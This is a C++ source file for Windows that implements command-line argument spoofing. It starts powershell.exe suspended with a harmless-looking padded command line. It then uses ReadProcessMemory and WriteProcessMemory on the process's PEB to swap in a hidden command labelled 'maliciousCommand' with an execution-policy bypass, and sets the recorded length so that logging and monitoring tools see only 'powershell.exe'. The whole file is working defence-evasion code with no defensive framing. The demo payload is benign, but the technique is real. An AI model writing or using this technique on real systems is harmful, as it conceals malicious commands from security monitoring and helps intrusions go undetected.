#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "ntdll.lib")

struct CUSTOM_PEB {
    BYTE Filler[16];
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
};

struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
    BYTE Filler[112];
    USHORT Length;
    USHORT MaximumLength;
    PVOID CommandLine;
};

std::wstring PadRight(const std::wstring& str, size_t totalWidth, wchar_t paddingChar) {
    if (str.length() >= totalWidth) return str;
    return str + std::wstring(totalWidth - str.length(), paddingChar);
}

int main() {
    std::wstring maliciousCommand = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";

    
    std::wstring spoofedCommand = PadRight(L"powershell.exe", maliciousCommand.length(), L' ');

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(sa);
    PROCESS_INFORMATION pi = { 0 };

    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(spoofedCommand.c_str()),
        &sa,
        &sa,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        L"C:\\windows\\",
        &si,
        &pi
    );

    if (!success) {
        return 1;
    }

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != 0) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    CUSTOM_PEB peb = { 0 };
    SIZE_T bytesRead = 0;
    ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);

    CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
    ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);

    std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
    ReadProcessMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);
    std::wstring cmdLine(cmdLineBuffer.data());

    std::vector<wchar_t> newCmdLine(maliciousCommand.begin(), maliciousCommand.end());
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);

    USHORT cmdLineLength = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
    WriteProcessMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);

    ResumeThread(pi.hThread);
	
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
